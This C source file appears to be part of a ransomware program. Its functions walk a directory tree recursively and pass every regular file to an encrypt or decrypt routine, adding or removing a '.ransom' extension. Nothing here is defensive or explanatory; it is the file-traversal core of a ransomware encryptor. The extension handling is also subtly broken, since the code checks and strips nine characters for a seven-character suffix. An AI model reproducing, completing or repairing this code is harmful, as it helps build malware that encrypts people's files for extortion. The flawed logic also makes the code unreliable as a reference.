#include "ransom.h"
#include <stdbool.h>

void get_new_path_name(char *parentpath, char *finalpath, char *currentpath)
{
    strcpy(finalpath, parentpath);
    strcat(finalpath, "/");
    strcat(finalpath, currentpath);
}

void add_file_extension(char *filename, char *opt_filename)
{
    strcpy(opt_filename, filename);
    strcat(opt_filename, ".ransom");
}

void remove_file_extension(char *filename, char *opt_filename)
{
    int len = strlen(filename);

    if (!strcmp(&filename[len - 9], ".ransom"))
        strncpy(opt_filename, filename, len - 9);
    else strcpy(opt_filename, filename);
}

static inline bool skip_path(const char *path,
    int (*action)(const char *, const char *, const char *))
{
    int len = strlen(path);

    if (strcmp(path, ".")
            && strcmp(path, "..")
            && (action != decrypt_file && strcmp(&path[len - 9], ".ransom")))
        return false;
    return true;
}

int iter_recursively_through_files(char *path, char *password,
    int (*action)(const char *, const char *, const char *))
{
    DIR *cur_dir = opendir(path);
    char new_path[MAX_FILEPATH];
    char opt_filename[MAX_FILEPATH];
    struct dirent *dirEntry = NULL;

    if (!cur_dir) {
        perror("opendir");
        return EXIT_FAILURE;
    }
    while ((dirEntry = readdir(cur_dir)) != NULL) {
        if (skip_path(dirEntry->d_name, action))
            continue;
        switch (dirEntry->d_type) {
            case 4:
                get_new_path_name(path, new_path, dirEntry->d_name);
                iter_recursively_through_files(new_path, password, action); break;
            case 8:
                get_new_path_name(path, new_path, dirEntry->d_name);
                if (action == encrypt_file)
                    add_file_extension(new_path, opt_filename);
                else remove_file_extension(new_path, opt_filename);
                action(new_path, opt_filename, password); break;
#ifdef _DIRENT_HAVE_D_TYPE
            case DT_UNKNOWN:
                dprintf(STDERR_FILENO, "Data Type Unknown\n"); break;
#endif
        }
    }
    closedir(cur_dir);
    return EXIT_SUCCESS;
}
